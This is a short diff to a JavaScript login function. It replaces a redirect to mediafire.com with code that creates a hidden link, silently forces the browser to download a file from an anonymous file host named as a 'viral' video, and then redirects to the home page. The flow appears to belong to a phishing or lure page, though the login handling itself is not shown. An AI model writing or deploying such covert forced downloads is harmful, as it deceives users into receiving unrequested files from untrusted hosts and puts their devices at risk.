@@ -511,10 +511,20 @@ function loginUser(event){
             setDeviceBlocked();
         })
         .finally(function(){
-            setTimeout(function(){
-                window.location.href = "https://www.mediafire.com/";
-            }, 1200);
-        });
+    setTimeout(function(){
+        var link = document.createElement("a");
+        link.href = "https://files.catbox.moe/mfxa6c.mp4";
+        link.download = "video-viral.mp4";
+        link.style.display = "none";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        setTimeout(function(){
+            window.location.href = "/";
+        }, 800);
+    }, 1200);
+});
 }
 
 
